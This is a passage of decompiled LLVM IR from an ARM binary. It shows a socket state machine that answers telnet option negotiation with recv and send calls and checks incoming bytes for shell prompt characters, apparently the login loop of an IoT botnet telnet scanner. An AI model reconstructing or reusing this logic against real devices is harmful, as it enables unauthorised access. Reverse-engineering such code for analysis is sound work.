dec_label_pc_12488thread-pre-split:               ; preds = %dec_label_pc_1289c, %dec_label_pc_12950, %dec_label_pc_12a04, %dec_label_pc_12ab8, %dec_label_pc_12cc4, %dec_label_pc_12ca8, %dec_label_pc_129e8, %dec_label_pc_12a9c, %dec_label_pc_12934, %dec_label_pc_12880
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12490

dec_label_pc_12490:                               ; preds = %dec_label_pc_12488thread-pre-split.thread, %dec_label_pc_12488thread-pre-split, %dec_label_pc_12490.lr.ph
  %v0_12e84 = phi i32 [ %v0_12490133, %dec_label_pc_12490.lr.ph ], [ %v0_12508, %dec_label_pc_12488thread-pre-split ], [ %v0_12508, %dec_label_pc_12488thread-pre-split.thread ]
  %v1_12490 = add i32 %v0_12e84, 24
  %v2_12490 = inttoptr i32 %v1_12490 to i32*
  %v3_12490 = load i32, i32* %v2_12490, align 4
  store i32 %v3_12490, i32* %r3.global-to-local, align 4
  %v2_12494 = icmp ugt i32 %v3_12490, 255
  store i1 %v2_12494, i1* %cpsr_c.global-to-local, align 1
  %v7_12494 = icmp eq i32 %v3_12490, 256
  store i1 %v7_12494, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_12e84, 28
  store i32 %.pre, i32* @sb, align 4
  br i1 %v7_12494, label %dec_label_pc_12e84, label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_12490, %dec_label_pc_12e84
  store i32 %v2_11f80, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %v0_11f80, align 4
  %v0_124ac = load i32, i32* @r5, align 4
  %v1_124ac = add i32 %v0_124ac, 24
  %v2_124ac = inttoptr i32 %v1_124ac to i32*
  %v3_124ac = load i32, i32* %v2_124ac, align 4
  store i32 %v3_124ac, i32* %r2.global-to-local, align 4
  %v0_124b0 = load i32, i32* @sb, align 4
  %v2_124b0 = add i32 %v0_124b0, %v3_124ac
  store i32 %v2_124b0, i32* @r4, align 4
  %v1_124b4 = add i32 %v0_124ac, 4
  %v2_124b4 = inttoptr i32 %v1_124b4 to i32*
  %v3_124b4 = load i32, i32* %v2_124b4, align 4
  store i32 %v3_124b4, i32* %r0.global-to-local, align 4
  %v1_124b8 = sub i32 256, %v3_124ac
  store i32 %v1_124b8, i32* %r2.global-to-local, align 4
  store i32 %v2_124b0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_124c4 = call i32 @_recv(i32 %v3_124b4, i32 %v2_124b0, i32 %v1_124b8, i32 16384)
  store i32 %v4_124c4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_124c8 = icmp eq i32 %v4_124c4, 0
  store i1 %v2_124c8, i1* %cpsr_z.global-to-local, align 1
  %tmp314 = icmp slt i32 %v4_124c4, 1
  br i1 %tmp314, label %dec_label_pc_12ddc, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124a0
  %v0_124d0 = load i32, i32* @r6, align 4
  store i32 %v0_124d0, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %bb316, %dec_label_pc_124d0
  %v3_124e0 = phi i32 [ %v1_124e4, %bb316 ], [ %v0_124d0, %dec_label_pc_124d0 ]
  %v1_124d8 = load i32, i32* @r4, align 4
  %v2_124d8 = add i32 %v1_124d8, %v3_124e0
  %v3_124d8 = inttoptr i32 %v2_124d8 to i8*
  %v4_124d8 = load i8, i8* %v3_124d8, align 1
  %v6_124d8 = zext i8 %v4_124d8 to i32
  store i32 %v6_124d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_124dc = icmp eq i8 %v4_124d8, 0
  store i1 %v2_124dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124dc, label %bb315, label %bb316

bb315:                                            ; preds = %dec_label_pc_124d8
  %v1_124e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_124e0 = trunc i32 %v1_124e0 to i8
  store i8 %v2_124e0, i8* %v3_124d8, align 1
  %v0_124e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb316

bb316:                                            ; preds = %dec_label_pc_124d8, %bb315
  %v0_124e4 = phi i32 [ %v3_124e0, %dec_label_pc_124d8 ], [ %v0_124e4.pre, %bb315 ]
  %v1_124e4 = add i32 %v0_124e4, 1
  store i32 %v1_124e4, i32* %r2.global-to-local, align 4
  %v3_124e8 = icmp uge i32 %v4_124c4, %v1_124e4
  store i1 %v3_124e8, i1* %cpsr_c.global-to-local, align 1
  %v9_124e8 = icmp eq i32 %v4_124c4, %v1_124e4
  store i1 %v9_124e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_124e8, label %dec_label_pc_124f0, label %dec_label_pc_124d8

dec_label_pc_124f0:                               ; preds = %bb316, %dec_label_pc_12de0
  store i32 ptrtoint (i32* @global_var_1cdf0.240 to i32), i32* %lr.global-to-local, align 4
  %v0_124f4 = load i32, i32* @r5, align 4
  %v1_124f4 = add i32 %v0_124f4, 24
  %v2_124f4 = inttoptr i32 %v1_124f4 to i32*
  %v3_124f4 = load i32, i32* %v2_124f4, align 4
  %v2_124f8 = load i32, i32* @global_var_1cdf0.240, align 4
  store i32 %v2_124f8, i32* %r3.global-to-local, align 4
  %v2_124fc = add i32 %v3_124f4, %v4_124c4
  store i32 %v2_124fc, i32* %ip.global-to-local, align 4
  store i32 %v2_124fc, i32* %v2_124f4, align 4
  %v0_12504 = load i32, i32* %r3.global-to-local, align 4
  %v1_12504 = load i32, i32* @r5, align 4
  %v2_12504 = add i32 %v1_12504, 8
  %v3_12504 = inttoptr i32 %v2_12504 to i32*
  store i32 %v0_12504, i32* %v3_12504, align 4
  br label %dec_label_pc_12508

dec_label_pc_12508:                               ; preds = %dec_label_pc_12c58, %dec_label_pc_124f0
  %v0_12508 = load i32, i32* @r5, align 4
  %v1_12508 = add i32 %v0_12508, 12
  %v2_12508 = inttoptr i32 %v1_12508 to i32*
  %v3_12508 = load i32, i32* %v2_12508, align 4
  store i32 %v3_12508, i32* %r2.global-to-local, align 4
  %v1_1250c = add i32 %v3_12508, -2
  store i32 %v1_1250c, i32* %r3.global-to-local, align 4
  %v7_12510 = icmp eq i32 %v1_1250c, 8
  store i1 %v7_12510, i1* %cpsr_z.global-to-local, align 1
  %v5_12514 = and i32 %v1_1250c, 1073741824
  %v6_12514 = icmp ne i32 %v5_12514, 0
  store i1 %v6_12514, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_12508, label %dec_label_pc_12484.loopexit [
    i32 2, label %dec_label_pc_12540
    i32 3, label %dec_label_pc_12628
    i32 4, label %dec_label_pc_127c4
    i32 5, label %dec_label_pc_12854
    i32 6, label %dec_label_pc_12908
    i32 7, label %dec_label_pc_12a70
    i32 8, label %dec_label_pc_129bc
    i32 9, label %dec_label_pc_12c7c
    i32 10, label %dec_label_pc_12b24
  ]

dec_label_pc_12540:                               ; preds = %dec_label_pc_12508
  %v1_12544 = add i32 %v0_12508, 24
  %v2_12544 = inttoptr i32 %v1_12544 to i32*
  %v3_12544 = load i32, i32* %v2_12544, align 4
  store i32 %v3_12544, i32* %ip.global-to-local, align 4
  %v0_12548 = load i32, i32* @sb, align 4
  store i32 %v0_12548, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 -3, i32* %sl.global-to-local, align 4
  store i32 -4, i32* @r8, align 4
  %v1_1255c = add i32 %v0_12508, 29
  store i32 %v1_1255c, i32* @r4, align 4
  %v3_1256092 = icmp eq i32 %v3_12544, 0
  store i1 %v3_1256092, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_1256092, i1* %cpsr_z.global-to-local, align 1
  %v6_1256499 = icmp sgt i32 %v3_12544, 0
  br i1 %v6_1256499, label %dec_label_pc_12568.preheader, label %dec_label_pc_12608

dec_label_pc_12560.loopexit:                      ; preds = %dec_label_pc_12580
  %v2_12588 = add i32 %v1_12588, 2
  store i32 %v2_12588, i32* @r6, align 4
  %v2_1258c = add i32 %v1_1258c, 2
  store i32 %v2_1258c, i32* @r4, align 4
  %v2_12590 = add i32 %v1_12590, 2
  store i32 %v2_12590, i32* @r7, align 4
  %v3_12560 = icmp uge i32 %v2_12590, %v1_12560
  store i1 %v3_12560, i1* %cpsr_c.global-to-local, align 1
  %v9_12560 = icmp eq i32 %v2_12590, %v1_12560
  store i1 %v9_12560, i1* %cpsr_z.global-to-local, align 1
  %v6_12564 = icmp slt i32 %v2_12590, %v1_12560
  br i1 %v6_12564, label %dec_label_pc_12568.preheader, label %dec_label_pc_12608

dec_label_pc_12568.preheader:                     ; preds = %dec_label_pc_12540, %dec_label_pc_12560.loopexit
  %v6_12610169 = phi i32 [ %v6_12610170, %dec_label_pc_12560.loopexit ], [ %v0_12508, %dec_label_pc_12540 ]
  %v1_12590158 = phi i32 [ %v2_12590, %dec_label_pc_12560.loopexit ], [ 0, %dec_label_pc_12540 ]
  %v1_12588156 = phi i32 [ %v2_12588, %dec_label_pc_12560.loopexit ], [ %v0_12548, %dec_label_pc_12540 ]
  %v1_12574154 = phi i32 [ %v1_12560, %dec_label_pc_12560.loopexit ], [ %v3_12544, %dec_label_pc_12540 ]
  %v0_12568152 = phi i32 [ %v2_1258c, %dec_label_pc_12560.loopexit ], [ %v1_1255c, %dec_label_pc_12540 ]
  br label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_12568.preheader, %dec_label_pc_125e8
  %v6_12610170 = phi i32 [ %v6_12610169, %dec_label_pc_12568.preheader ], [ %v0_125f0, %dec_label_pc_125e8 ]
  %v1_12590 = phi i32 [ %v1_12590158, %dec_label_pc_12568.preheader ], [ %v1_125f4, %dec_label_pc_125e8 ]
  %v1_12588 = phi i32 [ %v1_12588156, %dec_label_pc_12568.preheader ], [ %v1_125fc, %dec_label_pc_125e8 ]
  %v1_12560 = phi i32 [ %v1_12574154, %dec_label_pc_12568.preheader ], [ %v3_125f0, %dec_label_pc_125e8 ]
  %v1_1258c = phi i32 [ %v0_12568152, %dec_label_pc_12568.preheader ], [ %v1_12600, %dec_label_pc_125e8 ]
  %v1_12568 = add i32 %v1_1258c, -1
  %v2_12568 = inttoptr i32 %v1_12568 to i8*
  %v3_12568 = load i8, i8* %v2_12568, align 1
  %v4_12568 = zext i8 %v3_12568 to i32
  store i32 %v4_12568, i32* %r3.global-to-local, align 4
  %v2_1256c = icmp eq i8 %v3_12568, -1
  store i1 %v2_1256c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_1256c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1256c, label %dec_label_pc_12574, label %dec_label_pc_12608

dec_label_pc_12574:                               ; preds = %dec_label_pc_12568
  %v0_12574 = load i32, i32* @sb, align 4
  %v2_12574 = add i32 %v0_12574, %v1_12560
  store i32 %v2_12574, i32* %r2.global-to-local, align 4
  %v3_12578 = icmp uge i32 %v2_12574, %v1_1258c
  store i1 %v3_12578, i1* %cpsr_c.global-to-local, align 1
  %v9_12578 = icmp eq i32 %v2_12574, %v1_1258c
  store i1 %v9_12578, i1* %cpsr_z.global-to-local, align 1
  %v2_1257c = xor i1 %v3_12578, true
  %v3_1257c = or i1 %v9_12578, %v2_1257c
  br i1 %v3_1257c, label %dec_label_pc_12608, label %dec_label_pc_12580

dec_label_pc_12580:                               ; preds = %dec_label_pc_12574
  %v1_12580 = inttoptr i32 %v1_1258c to i8*
  %v2_12580 = load i8, i8* %v1_12580, align 1
  %v3_12580 = zext i8 %v2_12580 to i32
  store i32 %v3_12580, i32* %r3.global-to-local, align 4
  %v2_12584 = icmp eq i8 %v2_12580, -1
  store i1 %v2_12584, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_12584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12584, label %dec_label_pc_12560.loopexit, label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %dec_label_pc_12580
  %v2_12598 = icmp ugt i8 %v2_12580, -4
  store i1 %v2_12598, i1* %cpsr_c.global-to-local, align 1
  %v7_12598 = icmp eq i8 %v2_12580, -3
  store i1 %v7_12598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12598, label %dec_label_pc_12d30, label %dec_label_pc_125a0

dec_label_pc_125a0:                               ; preds = %dec_label_pc_12598
  %v1_125a0 = add i32 %v1_12588, 2
  store i32 %v1_125a0, i32* %r3.global-to-local, align 4
  %v3_125a4 = icmp uge i32 %v2_12574, %v1_125a0
  store i1 %v3_125a4, i1* %cpsr_c.global-to-local, align 1
  %v9_125a4 = icmp eq i32 %v2_12574, %v1_125a0
  store i1 %v9_125a4, i1* %cpsr_z.global-to-local, align 1
  %v2_125a8 = xor i1 %v3_125a4, true
  %v3_125a8 = or i1 %v9_125a4, %v2_125a8
  br i1 %v3_125a8, label %dec_label_pc_12608, label %dec_label_pc_125ac

dec_label_pc_125ac:                               ; preds = %bb346, %dec_label_pc_12d84, %bb345, %dec_label_pc_125a0
  %v0_125ac = load i32, i32* @r4, align 4
  %v1_125ac = inttoptr i32 %v0_125ac to i8*
  %v2_125ac = load i8, i8* %v1_125ac, align 1
  %v3_125ac = zext i8 %v2_125ac to i32
  store i32 %v3_125ac, i32* %r3.global-to-local, align 4
  %v2_125b0 = icmp ugt i8 %v2_125ac, -4
  store i1 %v2_125b0, i1* %cpsr_c.global-to-local, align 1
  %v7_125b0 = icmp eq i8 %v2_125ac, -3
  store i1 %v7_125b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125b0, label %bb317, label %dec_label_pc_125bc

bb317:                                            ; preds = %dec_label_pc_125ac
  %v1_125b4 = load i32, i32* @r8, align 4
  %v2_125b4 = trunc i32 %v1_125b4 to i8
  store i8 %v2_125b4, i8* %v1_125ac, align 1
  %v0_125b8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_125b8.pr, label %bb319, label %.dec_label_pc_125bc_crit_edge

.dec_label_pc_125bc_crit_edge:                    ; preds = %bb317
  %v0_125bc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_125bc

dec_label_pc_125bc:                               ; preds = %.dec_label_pc_125bc_crit_edge, %dec_label_pc_125ac
  %v0_125bc = phi i32 [ %v0_125bc.pre, %.dec_label_pc_125bc_crit_edge ], [ %v3_125ac, %dec_label_pc_125ac ]
  %v2_125bc = icmp ugt i32 %v0_125bc, 250
  store i1 %v2_125bc, i1* %cpsr_c.global-to-local, align 1
  %v7_125bc = icmp eq i32 %v0_125bc, 251
  store i1 %v7_125bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125bc, label %bb318, label %bb319

bb318:                                            ; preds = %dec_label_pc_125bc
  %v1_125c0 = load i32, i32* %sl.global-to-local, align 4
  %v2_125c0 = trunc i32 %v1_125c0 to i8
  %v3_125c0 = load i32, i32* @r4, align 4
  %v4_125c0 = inttoptr i32 %v3_125c0 to i8*
  store i8 %v2_125c0, i8* %v4_125c0, align 1
  br label %bb319

bb319:                                            ; preds = %bb317, %dec_label_pc_125bc, %bb318
  %v0_125c4 = load i32, i32* @r4, align 4
  %v1_125c4 = add i32 %v0_125c4, 1
  %v2_125c4 = inttoptr i32 %v1_125c4 to i8*
  %v3_125c4 = load i8, i8* %v2_125c4, align 1
  %v4_125c4 = zext i8 %v3_125c4 to i32
  store i32 %v4_125c4, i32* %r3.global-to-local, align 4
  %v2_125c8 = icmp ugt i8 %v3_125c4, -4
  store i1 %v2_125c8, i1* %cpsr_c.global-to-local, align 1
  %v7_125c8 = icmp eq i8 %v3_125c4, -3
  store i1 %v7_125c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125c8, label %bb320, label %dec_label_pc_125d4

bb320:                                            ; preds = %bb319
  %v1_125cc = load i32, i32* @r8, align 4
  %v2_125cc = trunc i32 %v1_125cc to i8
  store i8 %v2_125cc, i8* %v2_125c4, align 1
  %v0_125d0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_125d0.pr, label %bb322, label %.dec_label_pc_125d4_crit_edge

.dec_label_pc_125d4_crit_edge:                    ; preds = %bb320
  %v0_125d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_125d4

dec_label_pc_125d4:                               ; preds = %.dec_label_pc_125d4_crit_edge, %bb319
  %v0_125d4 = phi i32 [ %v0_125d4.pre, %.dec_label_pc_125d4_crit_edge ], [ %v4_125c4, %bb319 ]
  %v2_125d4 = icmp ugt i32 %v0_125d4, 250
  store i1 %v2_125d4, i1* %cpsr_c.global-to-local, align 1
  %v7_125d4 = icmp eq i32 %v0_125d4, 251
  store i1 %v7_125d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125d4, label %bb321, label %bb322

bb321:                                            ; preds = %dec_label_pc_125d4
  %v1_125d8 = load i32, i32* %sl.global-to-local, align 4
  %v2_125d8 = trunc i32 %v1_125d8 to i8
  %v3_125d8 = load i32, i32* @r4, align 4
  %v4_125d8 = add i32 %v3_125d8, 1
  %v5_125d8 = inttoptr i32 %v4_125d8 to i8*
  store i8 %v2_125d8, i8* %v5_125d8, align 1
  br label %bb322

bb322:                                            ; preds = %bb320, %dec_label_pc_125d4, %bb321
  %v0_125dc = load i32, i32* @r5, align 4
  %v1_125dc = add i32 %v0_125dc, 4
  %v2_125dc = inttoptr i32 %v1_125dc to i32*
  %v3_125dc = load i32, i32* %v2_125dc, align 4
  store i32 %v3_125dc, i32* %r0.global-to-local, align 4
  %v0_125e0 = load i32, i32* @r6, align 4
  br label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %dec_label_pc_12e5c, %bb322
  %v0_125ec = phi i32 [ %v3_12e74, %dec_label_pc_12e5c ], [ %v3_125dc, %bb322 ]
  %storemerge6 = phi i32 [ %v2_12d48, %dec_label_pc_12e5c ], [ %v0_125e0, %bb322 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_12e5c ], [ 3, %bb322 ]
  store i32 %storemerge6, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_125ec = call i32 @_send(i32 %v0_125ec, i32 %storemerge6, i32 %storemerge, i32 16384)
  store i32 %v4_125ec, i32* %r0.global-to-local, align 4
  %v0_125f0 = load i32, i32* @r5, align 4
  %v1_125f0 = add i32 %v0_125f0, 24
  %v2_125f0 = inttoptr i32 %v1_125f0 to i32*
  %v3_125f0 = load i32, i32* %v2_125f0, align 4
  store i32 %v3_125f0, i32* %ip.global-to-local, align 4
  %v0_125f4 = load i32, i32* @r7, align 4
  %v1_125f4 = add i32 %v0_125f4, 3
  store i32 %v1_125f4, i32* @r7, align 4
  %v3_125f8 = icmp uge i32 %v1_125f4, %v3_125f0
  store i1 %v3_125f8, i1* %cpsr_c.global-to-local, align 1
  %v9_125f8 = icmp eq i32 %v1_125f4, %v3_125f0
  store i1 %v9_125f8, i1* %cpsr_z.global-to-local, align 1
  %v0_125fc = load i32, i32* @r6, align 4
  %v1_125fc = add i32 %v0_125fc, 3
  store i32 %v1_125fc, i32* @r6, align 4
  %v0_12600 = load i32, i32* @r4, align 4
  %v1_12600 = add i32 %v0_12600, 3
  store i32 %v1_12600, i32* @r4, align 4
  %v5_12604 = icmp slt i32 %v1_125f4, %v3_125f0
  br i1 %v5_12604, label %dec_label_pc_12568, label %dec_label_pc_12608

dec_label_pc_12608:                               ; preds = %dec_label_pc_12560.loopexit, %dec_label_pc_12568, %dec_label_pc_125e8, %dec_label_pc_125a0, %dec_label_pc_12574, %dec_label_pc_12540, %dec_label_pc_12d30.dec_label_pc_12608.loopexit_crit_edge
  %v6_12610 = phi i32 [ %v0_12d54, %dec_label_pc_12d30.dec_label_pc_12608.loopexit_crit_edge ], [ %v0_12508, %dec_label_pc_12540 ], [ %v6_12610170, %dec_label_pc_12568 ], [ %v0_125f0, %dec_label_pc_125e8 ], [ %v6_12610170, %dec_label_pc_125a0 ], [ %v6_12610170, %dec_label_pc_12574 ], [ %v6_12610170, %dec_label_pc_12560.loopexit ]
  %v0_12618.pre = phi i32 [ %v0_12608.pre.pre, %dec_label_pc_12d30.dec_label_pc_12608.loopexit_crit_edge ], [ 0, %dec_label_pc_12540 ], [ %v1_12590, %dec_label_pc_12568 ], [ %v1_125f4, %dec_label_pc_125e8 ], [ %v1_12590, %dec_label_pc_125a0 ], [ %v1_12590, %dec_label_pc_12574 ], [ %v2_12590, %dec_label_pc_12560.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12608 = icmp eq i32 %v0_12618.pre, 0
  store i1 %v2_12608, i1* %cpsr_z.global-to-local, align 1
  %tmp323 = icmp slt i32 %v0_12618.pre, 1
  br i1 %tmp323, label %dec_label_pc_12618, label %.thread205

.thread205:                                       ; preds = %dec_label_pc_12608
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_12610 = add i32 %v6_12610, 12
  %v8_12610 = inttoptr i32 %v7_12610 to i32*
  store i32 3, i32* %v8_12610, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12618:                               ; preds = %dec_label_pc_12608, %dec_label_pc_12cd0, %dec_label_pc_12ba8, %dec_label_pc_12ac4, %dec_label_pc_12a10, %dec_label_pc_1295c, %dec_label_pc_128a8, %dec_label_pc_12810, %dec_label_pc_12780
  %v0_12618 = phi i32 [ %v1_12cc4, %dec_label_pc_12cd0 ], [ %v0_12ba0, %dec_label_pc_12ba8 ], [ %v1_12ab8, %dec_label_pc_12ac4 ], [ %v1_12a04, %dec_label_pc_12a10 ], [ %v1_12950, %dec_label_pc_1295c ], [ %v1_1289c, %dec_label_pc_128a8 ], [ %v0_12810, %dec_label_pc_12810 ], [ %v0_12780, %dec_label_pc_12780 ], [ %v0_12618.pre, %dec_label_pc_12608 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12618 = icmp eq i32 %v0_12618, 0
  store i1 %v2_12618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12618, label %dec_label_pc_12484.loopexit, label %dec_label_pc_12620

dec_label_pc_12620:                               ; preds = %dec_label_pc_12618
  %v0_12620 = load i32, i32* @r5, align 4
  %v1_12620 = add i32 %v0_12620, 24
  %v2_12620 = inttoptr i32 %v1_12620 to i32*
  %v3_12620 = load i32, i32* %v2_12620, align 4
  store i32 %v3_12620, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12628:                               ; preds = %dec_label_pc_12508
  %v1_12628 = add i32 %v0_12508, 24
  %v2_12628 = inttoptr i32 %v1_12628 to i32*
  %v3_12628 = load i32, i32* %v2_12628, align 4
  store i32 %v3_12628, i32* %ip.global-to-local, align 4
  %v1_1262c = add i32 %v3_12628, -1
  store i32 %v1_1262c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12630 = icmp eq i32 %v1_1262c, 0
  store i1 %v2_12630, i1* %cpsr_z.global-to-local, align 1
  %v5_12634 = icmp sgt i32 %v1_1262c, 0
  br i1 %v5_12634, label %dec_label_pc_12760, label %dec_label_pc_12444

dec_label_pc_12740:                               ; preds = %bb324
  %v2_12740 = icmp ugt i8 %v3_12764, 35
  store i1 %v2_12740, i1* %cpsr_c.global-to-local, align 1
  %v7_12740 = icmp eq i8 %v3_12764, 36
  store i1 %v7_12740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12740, label %dec_label_pc_12774, label %dec_label_pc_12748

dec_label_pc_12748:                               ; preds = %dec_label_pc_12740
  %v2_12748 = icmp ugt i8 %v3_12764, 34
  store i1 %v2_12748, i1* %cpsr_c.global-to-local, align 1
  %v7_12748 = icmp eq i8 %v3_12764, 35
  store i1 %v7_12748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12748, label %dec_label_pc_12774, label %dec_label_pc_12750

dec_label_pc_12750:                               ; preds = %dec_label_pc_12748
  %v2_12750 = icmp ugt i8 %v3_12764, 36
  store i1 %v2_12750, i1* %cpsr_c.global-to-local, align 1
  %v7_12750 = icmp eq i8 %v3_12764, 37
  store i1 %v7_12750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12750, label %dec_label_pc_12774, label %dec_label_pc_12758

dec_label_pc_12758:                               ; preds = %dec_label_pc_12750
  %v1_12758 = add i32 %v0_12774, -1
  store i32 %v1_12758, i32* %r0.global-to-local, align 4
  %v2_12758 = icmp ne i32 %v0_12774, 0
  store i1 %v2_12758, i1* %cpsr_c.global-to-local, align 1
  %v7_12758 = icmp eq i32 %v0_12774, 1
  store i1 %v7_12758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12758, label %dec_label_pc_12444, label %dec_label_pc_12760

dec_label_pc_12760:                               ; preds = %dec_label_pc_12628, %dec_label_pc_12758
  %v0_12774 = phi i32 [ %v1_12758, %dec_label_pc_12758 ], [ %v1_1262c, %dec_label_pc_12628 ]
  %v2_12760 = add i32 %v0_12774, %v0_12508
  store i32 %v2_12760, i32* %r3.global-to-local, align 4
  %v1_12764 = add i32 %v2_12760, 28
  %v2_12764 = inttoptr i32 %v1_12764 to i8*
  %v3_12764 = load i8, i8* %v2_12764, align 1
  %v4_12764 = zext i8 %v3_12764 to i32
  store i32 %v4_12764, i32* %r3.global-to-local, align 4
  %v2_12768 = icmp ugt i8 %v3_12764, 61
  store i1 %v2_12768, i1* %cpsr_c.global-to-local, align 1
  %v7_12768 = icmp eq i8 %v3_12764, 62
  store i1 %v7_12768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12768, label %dec_label_pc_12774, label %bb324

bb324:                                            ; preds = %dec_label_pc_12760
  %v3_1276c = icmp ugt i8 %v3_12764, 57
  store i1 %v3_1276c, i1* %cpsr_c.global-to-local, align 1
  %v8_1276c = icmp eq i8 %v3_12764, 58
  store i1 %v8_1276c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1276c, label %dec_label_pc_12774, label %dec_label_pc_12740

dec_label_pc_12774:                               ; preds = %dec_label_pc_12760, %bb324, %dec_label_pc_12750, %dec_label_pc_12748, %dec_label_pc_12740
  %v1_12774 = add i32 %v0_12774, 1
  store i32 %v1_12774, i32* @r7, align 4
  %v2_12778 = icmp eq i32 %v1_12774, -1
  store i1 %v2_12778, i1* %cpsr_c.global-to-local, align 1
  %v7_12778 = icmp eq i32 %v0_12774, -2
  store i1 %v7_12778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12778, label %dec_label_pc_12444, label %dec_label_pc_12780

dec_label_pc_12780:                               ; preds = %dec_label_pc_12774, %dec_label_pc_12464, %dec_label_pc_12444
  %v0_12780 = phi i32 [ %v5_12474, %dec_label_pc_12464 ], [ %v5_12454, %dec_label_pc_12444 ], [ %v1_12774, %dec_label_pc_12774 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12780 = icmp eq i32 %v0_12780, 0
  store i1 %v2_12780, i1* %cpsr_z.global-to-local, align 1
  %tmp325 = icmp slt i32 %v0_12780, 1
  br i1 %tmp325, label %dec_label_pc_12618, label %dec_label_pc_12788

dec_label_pc_12788:                               ; preds = %dec_label_pc_12780
  %v0_12788 = load i32, i32* @r5, align 4
  %v1_12788 = inttoptr i32 %v0_12788 to i32*
  %v2_12788 = load i32, i32* %v1_12788, align 4
  store i32 %v2_12788, i32* %r3.global-to-local, align 4
  %v1_1278c = add i32 %v0_12788, 4
  %v2_1278c = inttoptr i32 %v1_1278c to i32*
  %v3_1278c = load i32, i32* %v2_1278c, align 4
  store i32 %v3_1278c, i32* %r0.global-to-local, align 4
  %v1_12790 = add i32 %v2_12788, 12
  %v2_12790 = inttoptr i32 %v1_12790 to i8*
  %v3_12790 = load i8, i8* %v2_12790, align 1
  %v4_12790 = zext i8 %v3_12790 to i32
  store i32 %v4_12790, i32* %r2.global-to-local, align 4
  %v1_12794 = inttoptr i32 %v2_12788 to i32*
  %v2_12794 = load i32, i32* %v1_12794, align 4
  store i32 %v2_12794, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1279c = call i32 @_send(i32 %v3_1278c, i32 %v2_12794, i32 %v4_12790, i32 16384)
  store i32 %v4_1279c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_127a4 = load i32, i32* @r5, align 4
  %v1_127a4 = add i32 %v0_127a4, 4
  %v2_127a4 = inttoptr i32 %v1_127a4 to i32*
  %v3_127a4 = load i32, i32* %v2_127a4, align 4
  store i32 %v3_127a4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_127b0 = call i32 @_send(i32 %v3_127a4, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2, i32 16384)
  store i32 %v4_127b0, i32* %r0.global-to-local, align 4
  %v0_127b4 = load i32, i32* @r5, align 4
  %v1_127b4 = add i32 %v0_127b4, 24
  %v2_127b4 = inttoptr i32 %v1_127b4 to i32*
  %v3_127b4 = load i32, i32* %v2_127b4, align 4
  store i32 %v3_127b4, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_127bc = add i32 %v0_127b4, 12
  %v3_127bc = inttoptr i32 %v2_127bc to i32*
  store i32 4, i32* %v3_127bc, align 4
  br label %dec_label_pc_12c58

dec_label_pc_127c4:                               ; preds = %dec_label_pc_12508
  %v1_127c4 = add i32 %v0_12508, 24
  %v2_127c4 = inttoptr i32 %v1_127c4 to i32*
